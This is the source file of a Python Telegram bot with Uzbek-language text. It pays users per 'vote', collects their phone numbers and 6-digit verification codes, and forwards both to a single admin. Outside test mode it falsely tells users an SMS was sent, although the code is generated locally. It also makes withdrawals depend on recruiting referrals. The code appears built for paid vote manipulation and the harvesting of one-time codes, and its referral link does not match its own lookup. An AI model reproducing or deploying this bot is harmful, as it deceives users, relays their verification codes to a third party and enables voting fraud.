import asyncio
import os
import logging
import random
import string
import time
import re
from datetime import datetime, timedelta
from contextlib import contextmanager
from functools import wraps

import psycopg2
from psycopg2.extras import RealDictCursor
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from dotenv import load_dotenv

load_dotenv()

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('bot.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ================= CONFIG =================
class Config:
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
    DATABASE_URL = os.getenv("DATABASE_URL")
    VOICE_PRICE = int(os.getenv("VOICE_PRICE", 20000))
    MIN_WITHDRAW = int(os.getenv("MIN_WITHDRAW", 20000))
    MIN_REFERRALS = int(os.getenv("MIN_REFERRALS", 5))
    CODE_EXPIRE_MINUTES = int(os.getenv("CODE_EXPIRE_MINUTES", 5))
    TEST_MODE = os.getenv("TEST_MODE", "false").lower() == "true"

    if TEST_MODE:
        VOICE_PRICE = 100
        MIN_WITHDRAW = 100
        MIN_REFERRALS = 1

if not Config.BOT_TOKEN or Config.ADMIN_ID == 0:
    logger.error("❌ BOT_TOKEN yoki ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(token=Config.BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ================= DATABASE =================
class Database:
    def __init__(self):
        self.conn = None
        self.connect()

    def connect(self):
        try:
            self.conn = psycopg2.connect(Config.DATABASE_URL, sslmode='require')
            self.conn.autocommit = False
            logger.info("✅ Database connected")
        except Exception as e:
            logger.error(f"❌ Database error: {e}")
            raise

    def reconnect(self):
        try:
            if self.conn:
                self.conn.close()
        except:
            pass
        self.connect()

    @contextmanager
    def cursor(self):
        try:
            if not self.conn or self.conn.closed:
                self.reconnect()
            cur = self.conn.cursor(cursor_factory=RealDictCursor)
            yield cur
            self.conn.commit()
        except Exception as e:
            self.conn.rollback()
            logger.error(f"Database error: {e}")
            raise
        finally:
            cur.close()

    def execute(self, query, params=None, fetch_one=False, fetch_all=False):
        with self.cursor() as cur:
            cur.execute(query, params or ())
            if fetch_one:
                return cur.fetchone()
            if fetch_all:
                return cur.fetchall()
            return cur.rowcount

db = Database()

# ================= KEYBOARDS =================
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🗳️ Ovoz berish")],
            [KeyboardButton(text="💰 Balans"), KeyboardButton(text="👥 Referallar")],
            [KeyboardButton(text="💸 Yechish"), KeyboardButton(text="📜 Tarix")]
        ],
        resize_keyboard=True
    )

def get_phone_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Telefon raqam", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📊 Statistika")],
            [KeyboardButton(text="📨 Xabar yuborish")],
            [KeyboardButton(text="📋 Kodlar"), KeyboardButton(text="💸 So'rovlar")]
        ],
        resize_keyboard=True
    )

# ================= HELPERS =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    return None

def is_valid_phone(phone):
    phone = normalize_phone(phone)
    if not phone:
        return False
    if phone.startswith('+998') and len(phone) == 13:
        code = phone[4:6]
        return code in ['90', '91', '93', '94', '95', '97', '98', '99', '88', '33']
    return False

def generate_code():
    return ''.join(random.choices(string.digits, k=6))

def generate_referral_code():
    while True:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        result = db.execute("SELECT id FROM users WHERE referral_code = %s", (code,), fetch_one=True)
        if not result:
            return code

# ================= USER STATE =================
user_states = {}  # {user_id: state}
user_phones = {}  # {user_id: phone}

# ================= COMMANDS =================
@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    
    # Admin uchun
    if user_id == Config.ADMIN_ID:
        await message.answer("👋 Admin panel", reply_markup=get_admin_keyboard())
        return
    
    # Referral kodni tekshirish
    ref_code = None
    if message.text and ' ' in message.text:
        parts = message.text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            ref_code = parts[1][4:]
    
    # Foydalanuvchini qo'shish yoki olish
    user = db.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,), fetch_one=True)
    
    if not user:
        db.execute(
            "INSERT INTO users (telegram_id, phone, referral_code) VALUES (%s, 'no_phone_yet', %s)",
            (user_id, generate_referral_code())
        )
        user = db.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,), fetch_one=True)
        
        # Referral qo'shish
        if ref_code:
            referrer = db.execute("SELECT telegram_id FROM users WHERE referral_code = %s", (ref_code,), fetch_one=True)
            if referrer and referrer['telegram_id'] != user_id:
                db.execute(
                    "INSERT INTO referrals (referrer_id, referred_id) VALUES (%s, %s) ON CONFLICT DO NOTHING",
                    (referrer['telegram_id'], user_id)
                )
    
    # Bloklanganmi?
    if user and user.get('is_blocked'):
        await message.answer("❌ Siz bloklangansiz!")
        return
    
    # Telefon raqami bormi?
    if user['phone'] == 'no_phone_yet':
        user_states[user_id] = 'waiting_phone'
        await message.answer(
            f"🎉 Assalomu alaykum!\n\n"
            f"💰 1 ovoz = {Config.VOICE_PRICE:,} so'm\n\n"
            f"📱 Telefon raqamingizni yuboring:",
            reply_markup=get_phone_keyboard()
        )
    else:
        # Referallar soni
        ref_count = db.execute(
            "SELECT COUNT(*) as count FROM referrals WHERE referrer_id = %s",
            (user_id,), fetch_one=True
        )['count']
        
        # Telefon tasdiqlanganmi?
        verified = db.execute(
            "SELECT id FROM verified_phones WHERE phone = %s",
            (user['phone'],), fetch_one=True
        )
        
        status = "✅ Tasdiqlangan" if verified else "⏳ Kutilmoqda"
        
        await message.answer(
            f"👋 Xush kelibsiz!\n\n"
            f"📱 Telefon: {user['phone']}\n"
            f"📊 Holat: {status}\n"
            f"💰 Balans: {user['balance']:,} so'm\n"
            f"👥 Referallar: {ref_count}/{Config.MIN_REFERRALS}",
            reply_markup=get_main_keyboard()
        )

@dp.message(F.text == "🗳️ Ovoz berish")
async def vote(message: types.Message):
    user_id = message.from_user.id
    user = db.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,), fetch_one=True)
    
    if not user:
        await message.answer("❌ /start bosing", reply_markup=get_main_keyboard())
        return
    
    if user['is_blocked']:
        await message.answer("❌ Siz bloklangansiz!")
        return
    
    # Allaqachon ovoz berganmi?
    if user['phone'] != 'no_phone_yet':
        verified = db.execute(
            "SELECT id FROM verified_phones WHERE phone = %s",
            (user['phone'],), fetch_one=True
        )
        if verified:
            await message.answer("❌ Siz allaqachon ovoz bergansiz!")
            return
    
    user_states[user_id] = 'waiting_phone'
    await message.answer(
        f"🗳️ Ovoz berish\n\n"
        f"💰 1 ovoz = {Config.VOICE_PRICE:,} so'm\n\n"
        f"📱 Telefon raqamingizni yuboring:",
        reply_markup=get_phone_keyboard()
    )

@dp.message(F.contact)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    
    if user_states.get(user_id) != 'waiting_phone':
        return
    
    phone = normalize_phone(message.contact.phone_number)
    if not phone:
        await message.answer("❌ Noto'g'ri raqam!")
        return
    
    await process_phone(message, phone)

@dp.message(lambda m: user_states.get(m.from_user.id) == 'waiting_phone')
async def handle_phone_text(message: types.Message):
    user_id = message.from_user.id
    phone = normalize_phone(message.text)
    
    if not is_valid_phone(phone):
        await message.answer("❌ Noto'g'ri format! +998901234567")
        return
    
    await process_phone(message, phone)

async def process_phone(message: types.Message, phone: str):
    user_id = message.from_user.id
    
    # Raqam ishlatilganmi?
    if db.execute("SELECT id FROM verified_phones WHERE phone = %s", (phone,), fetch_one=True):
        await message.answer("❌ Bu raqam allaqachon ishlatilgan!")
        return
    
    # Telefonni saqlash
    db.execute("UPDATE users SET phone = %s WHERE telegram_id = %s", (phone, user_id))
    
    # Kod yaratish
    code = generate_code()
    db.execute(
        "INSERT INTO codes (phone, code, telegram_id, status, expires_at) VALUES (%s, %s, %s, 'pending', NOW() + INTERVAL '5 minutes')",
        (phone, code, user_id)
    )
    
    user_states[user_id] = 'waiting_code'
    user_phones[user_id] = phone
    
    # Test rejimida kodni ko'rsatish
    if Config.TEST_MODE:
        await message.answer(f"🧪 Kod: <code>{code}</code>\n\nIltimos, kodni kiriting:")
    else:
        await message.answer(f"✅ {phone} raqamiga SMS yuborildi!\n\n6 xonali kodni kiriting:")
    
    # Adminga xabar
    await bot.send_message(
        Config.ADMIN_ID,
        f"📱 Yangi raqam\n👤 ID: {user_id}\n📞 {phone}\n🔑 {code}"
    )

@dp.message(lambda m: user_states.get(m.from_user.id) == 'waiting_code')
async def handle_code(message: types.Message):
    user_id = message.from_user.id
    code = message.text.strip()
    
    if not code.isdigit() or len(code) != 6:
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    phone = user_phones.get(user_id)
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    # Kodni tekshirish
    code_data = db.execute(
        "SELECT * FROM codes WHERE phone = %s AND code = %s AND status = 'pending' AND expires_at > NOW()",
        (phone, code), fetch_one=True
    )
    
    if not code_data:
        await message.answer("❌ Noto'g'ri kod yoki muddati tugagan!")
        return
    
    # Kodni tasdiqlash uchun adminga yuborish
    db.execute("UPDATE codes SET status = 'pending_verify' WHERE id = %s", (code_data['id'],))
    
    user_states.pop(user_id, None)
    user_phones.pop(user_id, None)
    
    await message.answer("⏳ Kod qabul qilindi! Admin tasdiqlaydi...", reply_markup=get_main_keyboard())
    
    # Admin tugmalari
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Tasdiqlash", callback_data=f"verify_{user_id}"),
            InlineKeyboardButton(text="❌ Rad etish", callback_data=f"reject_{user_id}")
        ]
    ])
    
    await bot.send_message(
        Config.ADMIN_ID,
        f"🔑 Kod tekshirish\n👤 ID: {user_id}\n📞 {phone}\n🔑 {code}",
        reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_verify(callback: types.CallbackQuery):
    action, user_id = callback.data.split('_')
    user_id = int(user_id)
    
    if action == 'verify':
        # Tasdiqlash
        code_data = db.execute(
            "SELECT * FROM codes WHERE telegram_id = %s AND status = 'pending_verify' ORDER BY id DESC LIMIT 1",
            (user_id,), fetch_one=True
        )
        
        if not code_data:
            await callback.answer("❌ Kod topilmadi!", show_alert=True)
            return
        
        phone = code_data['phone']
        
        # Raqam ishlatilganmi?
        if db.execute("SELECT id FROM verified_phones WHERE phone = %s", (phone,), fetch_one=True):
            await callback.answer("❌ Raqam allaqachon ishlatilgan!", show_alert=True)
            return
        
        # Tasdiqlash
        db.execute("UPDATE codes SET status = 'verified' WHERE id = %s", (code_data['id'],))
        db.execute("INSERT INTO verified_phones (phone, telegram_id) VALUES (%s, %s)", (phone, user_id))
        db.execute(
            "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
            (Config.VOICE_PRICE, user_id)
        )
        db.execute(
            "INSERT INTO transactions (telegram_id, amount, type, description) VALUES (%s, %s, 'deposit', 'Ovoz')",
            (user_id, Config.VOICE_PRICE)
        )
        
        # Foydalanuvchiga xabar
        try:
            await bot.send_message(
                user_id,
                f"✅ Tasdiqlandi! +{Config.VOICE_PRICE:,} so'm",
                reply_markup=get_main_keyboard()
            )
        except:
            pass
        
        await callback.message.edit_text(f"✅ Tasdiqlandi! 👤 {user_id} +{Config.VOICE_PRICE:,} so'm")
        await callback.answer("✅ Tasdiqlandi!")
        
    else:  # reject
        db.execute(
            "UPDATE codes SET status = 'rejected' WHERE telegram_id = %s AND status = 'pending_verify'",
            (user_id,)
        )
        
        try:
            await bot.send_message(
                user_id,
                "❌ Kod rad etildi! Qaytadan urinib ko'ring.",
                reply_markup=get_main_keyboard()
            )
        except:
            pass
        
        await callback.message.edit_text(f"❌ Rad etildi! 👤 {user_id}")
        await callback.answer("❌ Rad etildi!")

@dp.message(F.text == "💰 Balans")
async def show_balance(message: types.Message):
    user_id = message.from_user.id
    user = db.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,), fetch_one=True)
    
    if not user:
        await message.answer("❌ /start bosing")
        return
    
    await message.answer(f"💰 Balans: {user['balance']:,} so'm")

@dp.message(F.text == "👥 Referallar")
async def show_referrals(message: types.Message):
    user_id = message.from_user.id
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
    
    ref_count = db.execute(
        "SELECT COUNT(*) as count FROM referrals WHERE referrer_id = %s",
        (user_id,), fetch_one=True
    )['count']
    
    await message.answer(
        f"👥 Referallar: {ref_count}/{Config.MIN_REFERRALS}\n\n"
        f"🔗 Link: <code>{ref_link}</code>"
    )

@dp.message(F.text == "💸 Yechish")
async def withdraw(message: types.Message):
    user_id = message.from_user.id
    user = db.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,), fetch_one=True)
    
    if not user:
        await message.answer("❌ /start bosing")
        return
    
    # Tekshirishlar
    if user['phone'] == 'no_phone_yet':
        await message.answer("❌ Avval ro'yxatdan o'ting!")
        return
    
    if not db.execute("SELECT id FROM verified_phones WHERE phone = %s", (user['phone'],), fetch_one=True):
        await message.answer("❌ Telefon tasdiqlanmagan!")
        return
    
    if user['balance'] < Config.MIN_WITHDRAW:
        await message.answer(f"❌ Yetarli balans emas! Kerak: {Config.MIN_WITHDRAW:,} so'm")
        return
    
    ref_count = db.execute(
        "SELECT COUNT(*) as count FROM referrals WHERE referrer_id = %s",
        (user_id,), fetch_one=True
    )['count']
    
    if ref_count < Config.MIN_REFERRALS:
        await message.answer(f"❌ {Config.MIN_REFERRALS} ta referral kerak! Hozir: {ref_count}")
        return
    
    user_states[user_id] = 'waiting_withdraw'
    await message.answer(
        "💸 Karta raqami yoki telefon raqamini yuboring:",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="❌ Bekor qilish")]],
            resize_keyboard=True
        )
    )

@dp.message(lambda m: user_states.get(m.from_user.id) == 'waiting_withdraw')
async def handle_withdraw_info(message: types.Message):
    user_id = message.from_user.id
    info = message.text.strip()
    
    if info == "❌ Bekor qilish":
        user_states.pop(user_id, None)
        await message.answer("✅ Bekor qilindi", reply_markup=get_main_keyboard())
        return
    
    user = db.execute("SELECT * FROM users WHERE telegram_id = %s", (user_id,), fetch_one=True)
    
    # Yechish so'rovini saqlash
    db.execute(
        "INSERT INTO withdraws (telegram_id, phone, amount, status) VALUES (%s, %s, %s, 'pending')",
        (user_id, info, user['balance'])
    )
    
    # Balansni nolga tushirish
    db.execute("UPDATE users SET balance = 0 WHERE telegram_id = %s", (user_id,))
    db.execute(
        "INSERT INTO transactions (telegram_id, amount, type, description) VALUES (%s, %s, 'withdraw', 'Yechish')",
        (user_id, user['balance'])
    )
    
    user_states.pop(user_id, None)
    
    await message.answer(
        f"✅ So'rov qabul qilindi!\n💰 {user['balance']:,} so'm",
        reply_markup=get_main_keyboard()
    )
    
    # Admin tugmalari
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ To'landi", callback_data=f"wdone_{user_id}"),
            InlineKeyboardButton(text="❌ Rad etish", callback_data=f"wreject_{user_id}")
        ]
    ])
    
    await bot.send_message(
        Config.ADMIN_ID,
        f"💸 Yechish so'rovi\n👤 ID: {user_id}\n📱 {info}\n💰 {user['balance']:,} so'm",
        reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data.startswith(("wdone_", "wreject_")))
async def admin_withdraw(callback: types.CallbackQuery):
    action, user_id = callback.data.split('_')
    user_id = int(user_id)
    
    withdraw = db.execute(
        "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
        (user_id,), fetch_one=True
    )
    
    if not withdraw:
        await callback.answer("❌ So'rov topilmadi!", show_alert=True)
        return
    
    if action == 'wdone':
        db.execute("UPDATE withdraws SET status = 'completed' WHERE id = %s", (withdraw['id'],))
        await callback.message.edit_text(f"✅ To'landi! 👤 {user_id}")
        await callback.answer("✅ To'landi!")
    else:
        db.execute("UPDATE withdraws SET status = 'rejected' WHERE id = %s", (withdraw['id'],))
        db.execute(
            "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
            (withdraw['amount'], user_id)
        )
        await callback.message.edit_text(f"❌ Rad etildi! 👤 {user_id}")
        await callback.answer("❌ Rad etildi!")

@dp.message(F.text == "📜 Tarix")
async def show_history(message: types.Message):
    user_id = message.from_user.id
    transactions = db.execute(
        "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 10",
        (user_id,), fetch_all=True
    )
    
    if not transactions:
        await message.answer("📭 Tarix yo'q")
        return
    
    text = "📜 TRANZAKSIYALAR:\n\n"
    for t in transactions:
        sign = "+" if t['type'] == 'deposit' else "-"
        text += f"{sign}{t['amount']:,} so'm - {t['description'] or t['type']}\n"
    
    await message.answer(text)

# ================= ADMIN COMMANDS =================
@dp.message(F.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    stats = {
        'users': db.execute("SELECT COUNT(*) as count FROM users", fetch_one=True)['count'],
        'verified': db.execute("SELECT COUNT(*) as count FROM verified_phones", fetch_one=True)['count'],
        'pending': db.execute("SELECT COUNT(*) as count FROM codes WHERE status = 'pending_verify'", fetch_one=True)['count'],
        'withdraws': db.execute("SELECT COUNT(*) as count FROM withdraws WHERE status = 'pending'", fetch_one=True)['count'],
        'balance': db.execute("SELECT COALESCE(SUM(balance), 0) as sum FROM users", fetch_one=True)['sum'],
    }
    
    await message.answer(
        f"📊 STATISTIKA\n\n"
        f"👥 Foydalanuvchilar: {stats['users']}\n"
        f"✅ Tasdiqlangan: {stats['verified']}\n"
        f"⏳ Kutayotgan: {stats['pending']}\n"
        f"💸 Yechish: {stats['withdraws']}\n"
        f"💰 Jami balans: {stats['balance']:,} so'm"
    )

@dp.message(F.text == "📋 Kodlar")
async def admin_codes(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    codes = db.execute(
        "SELECT * FROM codes WHERE status = 'pending_verify' ORDER BY id DESC LIMIT 20",
        fetch_all=True
    )
    
    if not codes:
        await message.answer("📭 Kodlar yo'q")
        return
    
    text = "📋 KODLAR:\n\n"
    for c in codes:
        text += f"👤 {c['telegram_id']}\n📞 {c['phone']}\n🔑 {c['code']}\n➖➖➖\n"
    
    await message.answer(text)

@dp.message(F.text == "💸 So'rovlar")
async def admin_withdraws(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    withdraws = db.execute(
        "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20",
        fetch_all=True
    )
    
    if not withdraws:
        await message.answer("📭 So'rovlar yo'q")
        return
    
    text = "💸 SO'ROVLAR:\n\n"
    for w in withdraws:
        text += f"👤 {w['telegram_id']}\n📱 {w['phone']}\n💰 {w['amount']:,} so'm\n➖➖➖\n"
    
    await message.answer(text)

@dp.message(F.text == "📨 Xabar yuborish")
async def admin_broadcast(message: types.Message):
    if message.from_user.id != Config.ADMIN_ID:
        return
    
    user_states[Config.ADMIN_ID] = 'waiting_broadcast'
    await message.answer("📨 Xabar matnini yozing:")

@dp.message(lambda m: m.from_user.id == Config.ADMIN_ID and user_states.get(Config.ADMIN_ID) == 'waiting_broadcast')
async def send_broadcast(message: types.Message):
    if message.text.lower() == "bekor":
        user_states.pop(Config.ADMIN_ID, None)
        await message.answer("✅ Bekor qilindi")
        return
    
    user_states.pop(Config.ADMIN_ID, None)
    
    users = db.execute("SELECT telegram_id FROM users WHERE is_blocked = FALSE", fetch_all=True)
    
    sent = 0
    for user in users:
        try:
            await bot.send_message(user['telegram_id'], f"📨 {message.text}")
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    
    await message.answer(f"✅ {sent} ta foydalanuvchiga yuborildi!")

# ================= CLEANUP =================
async def cleanup():
    while True:
        try:
            db.execute("UPDATE codes SET status = 'expired' WHERE status IN ('pending', 'pending_verify') AND expires_at < NOW()")
        except:
            pass
        await asyncio.sleep(60)

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    # Jadvallarni yaratish
    with db.cursor() as cur:
        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE,
                phone VARCHAR(20),
                balance INTEGER DEFAULT 0,
                referral_code VARCHAR(20) UNIQUE,
                is_blocked BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20),
                code VARCHAR(10),
                telegram_id BIGINT,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_phones (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) UNIQUE,
                telegram_id BIGINT,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT,
                amount INTEGER,
                type VARCHAR(20),
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT,
                phone VARCHAR(100),
                amount INTEGER,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                processed_at TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT,
                referred_id BIGINT UNIQUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    
    asyncio.create_task(cleanup())
    
    logger.info("✅ Bot tayyor!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
